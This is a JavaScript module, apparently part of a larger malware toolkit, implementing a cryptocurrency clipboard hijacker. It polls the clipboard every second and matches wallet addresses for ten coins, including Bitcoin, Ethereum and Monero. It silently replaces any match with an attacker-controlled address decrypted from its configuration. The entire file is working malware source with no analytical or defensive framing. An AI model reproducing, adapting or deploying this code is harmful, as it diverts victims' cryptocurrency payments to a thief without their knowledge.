module.exports = (client) => {
  return {
    async detectClipboard() {
      while (true) {
        const paste = client.requires.ncp.readSync();
        var text = paste;

        for (let [key, value] of Object.entries({
          btc: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
          ltc: /(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)/,
          eth: /(?:^0x[a-fA-F0-9]{40}$)/,
          xlm: /(?:^G[0-9a-zA-Z]{55}$)/,
          xmr: /(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)/,
          xrp: /(?:^r[0-9a-zA-Z]{24,34}$)/,
          bch: /^((bitcoincash:)?(q|p)[a-z0-9]{41})/,
          dash: /(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)/,
          neo: /(?:^A[0-9a-zA-Z]{33}$)/,
          doge: /D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}/,
        })) {
          for (let _value of paste.split("\n")) {
            if (_value.match(value)) {
              text = text.replace(
                _value,
                client.utils.encryption.decryptData(client.config.crypto[key])
              );
            }
          }
        }

        if (paste != text) {
          client.requires.ncp.writeSync(text);
        }

        await client.utils.time.sleep(1000);
      }
    },
  };
};